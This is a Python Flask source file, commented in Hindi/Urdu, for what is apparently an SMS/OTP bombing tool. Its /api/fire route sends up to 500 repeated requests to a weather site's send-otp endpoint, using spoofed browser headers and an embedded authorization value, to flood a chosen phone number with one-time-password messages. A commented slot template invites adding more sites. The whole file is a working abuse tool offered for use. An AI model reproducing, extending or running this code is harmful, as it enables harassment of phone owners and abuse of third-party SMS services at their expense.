from flask import Flask, request, jsonify, render_template
from flask_cors import CORS
import requests
import os

app = Flask(__name__)
CORS(app)

# ─────────────────────────────────────────────────────────
# API SLOTS — yahan apni APIs add karo
# ─────────────────────────────────────────────────────────
API_SLOTS = [
    {
        "name": "WeatherWalay OTP",
        "enabled": True,
        "url": "https://app.weatherwalay.com/web/otp/send-otp",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "authorization": "base64 5aHXZfbQHDDaNeOnhvfTkkbw8kzvr9usVJ8ux78Zah+k8PXH+OxEopEdmUAabtOOUww2Ac/o9ChS3aTy",
            "origin": "https://www.weatherwalay.com",
            "referer": "https://www.weatherwalay.com/",
            "user-agent": "Mozilla/5.0 (Linux; Android 16; Pixel 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Mobile Safari/537.36",
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8"
        },
        "body": {"phone": "{phone}"},
        "body_type": "json"
    },
    # SLOT 2 — yahan add karo
    # {
    #     "name": "Site2 OTP",
    #     "enabled": True,
    #     "url": "https://api.site2.com/otp",
    #     "method": "POST",
    #     "headers": {"Content-Type": "application/json", "Authorization": "Bearer TOKEN"},
    #     "body": {"mobile": "{phone}"},
    #     "body_type": "json"
    # },
]

def resolve_body(body, phone):
    if isinstance(body, dict):
        return {k: resolve_body(v, phone) for k, v in body.items()}
    if isinstance(body, str):
        return body.replace("{phone}", phone)
    return body

def fire_request(slot, phone, iteration=1):
    try:
        body    = resolve_body(slot["body"], phone)
        headers = slot["headers"].copy()
        url     = slot["url"].replace("{phone}", phone)
        method  = slot["method"].upper()

        if method == "POST":
            if slot.get("body_type") == "json":
                resp = requests.post(url, json=body, headers=headers, timeout=15)
            else:
                resp = requests.post(url, data=body, headers=headers, timeout=15)
        else:
            resp = requests.get(url, headers=headers, timeout=15)

        try:
            resp_data = resp.json()
        except:
            resp_data = resp.text[:300]

        return {
            "slot": slot["name"],
            "iteration": iteration,
            "success": resp.status_code in [200, 201, 202],
            "status_code": resp.status_code,
            "response": resp_data
        }
    except requests.exceptions.Timeout:
        return {"slot": slot["name"], "iteration": iteration, "success": False, "error": "Timeout — server ne jawab nahi diya"}
    except Exception as e:
        return {"slot": slot["name"], "iteration": iteration, "success": False, "error": str(e)}

# ─────────────────────────────────────────────────────────
# ROUTES
# ─────────────────────────────────────────────────────────

@app.route('/')
def index():
    active_slots = [s for s in API_SLOTS if s["enabled"]]
    return render_template('index.html', slots=active_slots, total_slots=len(active_slots))

@app.route('/api/slots')
def get_slots():
    return jsonify([
        {"index": i, "name": s["name"], "enabled": s["enabled"]}
        for i, s in enumerate(API_SLOTS)
    ])

@app.route('/api/fire', methods=['POST'])
def fire():
    data  = request.get_json(force=True) or {}
    phone = data.get("phone", "").strip()
    count = int(data.get("count", 1))
    mode  = data.get("mode", "all")  # all / single
    slot_index = int(data.get("slot_index", 0))

    if not phone:
        return jsonify({"error": "Phone number required"}), 400
    if count < 1 or count > 500:
        return jsonify({"error": "Count must be 1-500"}), 400

    results = []
    active_slots = [s for s in API_SLOTS if s["enabled"]]

    if mode == "single" and slot_index < len(API_SLOTS):
        slot = API_SLOTS[slot_index]
        for i in range(count):
            results.append(fire_request(slot, phone, i + 1))
    else:
        for i in range(count):
            for slot in active_slots:
                results.append(fire_request(slot, phone, i + 1))

    ok   = sum(1 for r in results if r.get("success"))
    fail = sum(1 for r in results if not r.get("success"))

    return jsonify({
        "total":   len(results),
        "success": ok,
        "failed":  fail,
        "results": results
    })

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
